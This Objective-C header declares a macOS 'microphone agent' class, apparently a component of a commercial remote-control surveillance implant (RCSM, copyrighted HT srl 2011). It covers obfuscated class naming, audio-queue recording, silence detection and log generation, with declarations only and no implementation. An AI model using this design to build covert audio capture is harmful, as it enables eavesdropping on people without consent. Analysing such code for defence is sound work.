/*
 * RCSMAgentMicrophone.h
 *  Microphone Agent for MacOS
 *  Uses AudioQueues from AudioToolbox
 *
 * Created by Alfredo 'revenge' Pesoli on 8/3/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import <Foundation/Foundation.h>
#import <AudioToolbox/AudioQueue.h>

#ifndef __RCSMAgentMicrophone_h__
#define __RCSMAgentMicrophone_h__

#import "RCSMCommon.h"

typedef struct _microphone {
  u_int detectSilence;
  u_int silenceThreshold;
} microphoneAgentStruct;

typedef struct _microphoneHeader {
  u_int version;
#define LOG_MICROPHONE_VERSION 2008121901
  u_int sampleRate;
  u_int hiTimestamp;
  u_int loTimestamp;
} microphoneAdditionalStruct;


static const int kNumberBuffers = 3;

void myInputAudioCallback(void                               *inUserData,
                          AudioQueueRef                      inAQ,
                          AudioQueueBufferRef                inBuffer,
                          const AudioTimeStamp               *inStartTime,
                          UInt32                             inNumPackets,
                          const AudioStreamPacketDescription *inPacketDescs);

@interface __m_MAgentMicrophone : NSObject <Agents>
{
@private
  NSMutableDictionary         *mAgentConfiguration;
  BOOL                        mIsRunning;

@private
  AudioStreamBasicDescription mDataFormat;
  AudioQueueRef               mQueue;
  AudioQueueBufferRef         mBuffers[3];
  SInt64                      mCurrentPacket;
  uint32_t                    mIsVADActive;
  uint32_t                    mSilenceThreshold;
  
@private
  int32_t                     mLoTimestamp;
  int32_t                     mHiTimestamp;
  
@private
  int32_t                     mFileCounter;
  NSLock                      *mLockGeneric;

@private
  NSMutableData               *mAudioBuffer;
}

@property (readonly)          BOOL mIsRunning;
@property (readonly)          AudioStreamBasicDescription mDataFormat;
@property (readwrite, assign) AudioQueueRef mQueue;
@property (readwrite, assign) SInt64 mCurrentPacket;
@property (readonly)          uint32_t mIsVADActive;
@property (readonly)          uint32_t mSilenceThreshold;
@property (readonly)          NSLock *mLockGeneric;
@property (readwrite, assign) NSMutableData *mAudioBuffer;

+ (__m_MAgentMicrophone *)sharedInstance;

+ (id)allocWithZone: (NSZone *)aZone;

- (unsigned)retainCount;
- (id)retain;
- (id)autorelease;
- (void)release;
- (id)copyWithZone: (NSZone *)aZone;
- (id)init;

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
- (NSMutableDictionary *)mAgentConfiguration;

- (void)startRecord;
- (void)stopRecord;
- (void)setupAudioWithFormatID: (UInt32)formatID;

- (void)generateLog;

@end

#endif
